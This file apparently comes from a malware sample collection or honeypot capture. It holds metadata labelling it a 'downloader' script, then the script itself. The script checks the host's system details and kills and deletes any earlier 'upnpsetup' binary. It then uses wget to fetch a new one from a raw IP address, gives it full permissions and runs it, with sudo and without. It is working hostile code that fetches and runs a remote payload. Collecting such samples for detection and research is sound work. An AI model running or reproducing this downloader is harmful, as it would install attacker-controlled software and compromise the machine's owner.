@@ -1,0 +1,18 @@
+# sha256: 507968b2d3990a4b640fb49959edd3787f004d8e8ba862eb282c03bf1f890681
+# family: downloader
+# kind: script
+# size_bytes: 206
+# first_seen: 2026-08-26 09:44:39.865000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+uname -a
+hostname
+uname -m&&pkill upnpsetup
+sudo pkill upnpsetup
+rm ./upnpsetup
+wget -nc http://45.87.174.8/k.php?a=x86_64,2MWJMY85P3VUFVL0H -O ./upnpsetup
+chmod 777 ./upnpsetup
+sudo ./upnpsetup
+./upnpsetup
